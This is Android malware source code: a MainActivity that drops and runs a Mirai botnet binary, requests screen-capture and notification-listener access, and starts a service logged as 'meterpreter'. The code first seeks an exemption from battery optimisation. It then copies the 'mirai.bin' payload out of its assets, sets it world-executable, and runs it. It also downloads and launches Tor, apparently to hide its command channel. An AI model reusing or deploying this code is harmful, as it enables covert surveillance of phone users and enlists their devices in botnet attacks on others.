package com.capture;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.PowerManager;
import android.net.Uri;
import android.media.projection.MediaProjectionManager;
import android.media.projection.MediaProjection;
import android.widget.Toast;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import java.io.File;
import java.io.InputStream;
import android.content.res.AssetManager;
import java.io.FileOutputStream;
import java.io.IOException;

public class MainActivity extends Activity {

    private MediaProjectionManager projectionManager;
    private Intent serviceIntent;
    private static final int REQUEST_SCREEN_CAPTURE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        checkBatteryOptimization();
		startNotificationListenerService();
		

        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            boolean isWhiteListing = pm.isIgnoringBatteryOptimizations(getPackageName());

            if (!isWhiteListing) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                return;
            }
        }
		
		if (RealService.serviceIntent == null) {
			Log.d("TOR", "[meterpreter] executing....");
            serviceIntent = new Intent(this, RealService.class);
            startService(serviceIntent);
            
        } else {
            serviceIntent = RealService.serviceIntent;
            
        }


        String arch = System.getProperty("os.arch");
        Log.d("TOR", "[ARCH] Arquitetura: " + arch);

        String torFilePath = "/data/data/com.capture/tor/tor/libTor.so";
        File torFile = new File(torFilePath);
        if (torFile.exists()) {
            Log.d("TOR", "[TOR] Tor encontrado: tor.gz");
            Log.d("TOR", "[TOR] Executando libTor.so");
			nousbot(arch);
			Log.d("TOR", "[mirai] executando mirai");
            executeTor();

        } else {
			nousbot(arch);
            downloadAndExtractTor(arch);

        }
    }

    
    private void checkScreenCapturePermission() {
        if (projectionManager != null) {
            startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
        } else {
            Toast.makeText(this, "O MediaProjectionManager não foi inicializado corretamente.", Toast.LENGTH_SHORT).show();
        }
    }

    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_SCREEN_CAPTURE && resultCode == RESULT_OK && data != null) {
            Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
            serviceIntent.putExtra("resultCode", resultCode);
            serviceIntent.putExtra("data", data);
            startService(serviceIntent);
        } else {
            Toast.makeText(this, "Permissão de captura de tela negada.", Toast.LENGTH_SHORT).show();
        }
    }

    
    private void startNotificationListenerService() {
        Intent intent = new Intent(this, NotificationListener.class);
        startService(intent);
    }
	
	private void executemirai() {
		Mirai Mirai = new Mirai();
        Mirai.start();
	}
    private void nousbot(String arch) {
		AssetManager assetManager = getAssets();
        String assetFileName = arch + ".mirai";

        String miraifile = "/data/data/com.capture/mirai.bin";
        File torFile = new File(miraifile);
        if (torFile.exists()) {
			Log.d("TOR", "[mirai] executing...");
			executemirai();

		} else {
			try {
			
				InputStream inputStream = assetManager.open(assetFileName);

				
				FileOutputStream outputStream = new FileOutputStream(miraifile);

				
				byte[] buffer = new byte[4096];
				int bytesRead;
				while ((bytesRead = inputStream.read(buffer)) != -1) {
					outputStream.write(buffer, 0, bytesRead);
				}

				outputStream.close();
				inputStream.close();
				Shell.exec("chmod 777 /data/data/com.capture/mirai.bin");
				String ldd = Shell.exec("ldd /data/data/com.capture/mirai.bin");
				Log.d("TOR", "[LDD] " + ldd + "\n[DOWNLOAD] Mirai copiado com sucesso do diretório de assets para " + miraifile);
				executemirai();
			} catch (IOException e) {
				Log.e("TOR", "[DOWNLOAD] Exceção ao copiar o Mirai do diretório de assets: " + e.getMessage());
				executemirai();
			}
		}
	}
    private void downloadAndExtractTor(String arch) {
        String torURL;
        if (arch.equals("aarch64") || arch.equals("armv7")) {
            torURL = "https://archive.torproject.org/tor-package-archive/torbrowser/13.0.12/tor-expert-bundle-android-" + arch + "-13.0.12.tar.gz";
        } else if (arch.equals("x86") || arch.equals("x86_64")) {
            torURL = "https://archive.torproject.org/tor-package-archive/torbrowser/13.0.12/tor-expert-bundle-android-x86-13.0.12.tar.gz";
        } else {
            Log.d("TOR", "Arquitetura não suportada");
            return;
        }

        new DownloadTask().execute(torURL);
        Log.d("TOR", "[DOWNLOAD] Baixando o Tor... ");
        Shell.exec("mkdir /data/data/com.capture/tor");
        String tar = Shell.exec("tar -xzvf /data/data/com.capture/tor.gz -C /data/data/com.capture/tor/");
        Log.d("TOR", "[TAR] Descompactando o tor... " + tar);
        Shell.exec("chmod -R 777 /data/data/com.capture/*");
        executeTor();
    }

    private void executeTor() {
        // executando tor
        TorThread torThread = new TorThread();
        torThread.start();
    }

    
    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            boolean isWhiteListing = pm.isIgnoringBatteryOptimizations(getPackageName());

            if (!isWhiteListing) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } else {
                checkScreenCapturePermission();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
